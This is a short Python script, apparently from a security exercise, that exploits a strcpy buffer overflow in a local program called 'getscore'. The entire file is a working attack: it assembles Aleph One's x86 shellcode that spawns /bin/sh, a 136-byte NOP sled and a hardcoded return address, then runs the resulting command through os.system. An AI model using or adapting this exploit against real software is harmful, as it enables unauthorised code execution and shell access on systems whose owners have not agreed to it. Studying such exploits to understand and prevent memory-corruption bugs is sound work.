import os

# Shell code taken from Aleph's Smashing The Stack For Fun And Profit
shellcode = ("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""\x80\xe8\xdc\xff\xff\xff/bin/sh")
# nopSled length (136) based on the exact point of overflow
nopSled = ("\x90"*136)
# address based on the address os the %esp register
address = ("\xa7\x2b\x12\x42")
# The vulnerable program was a C program using strcpy
attack = "./getscore aaa " + nopSled + address + shellcode
# Executing the above attack command in a subshell
os.system(attack)
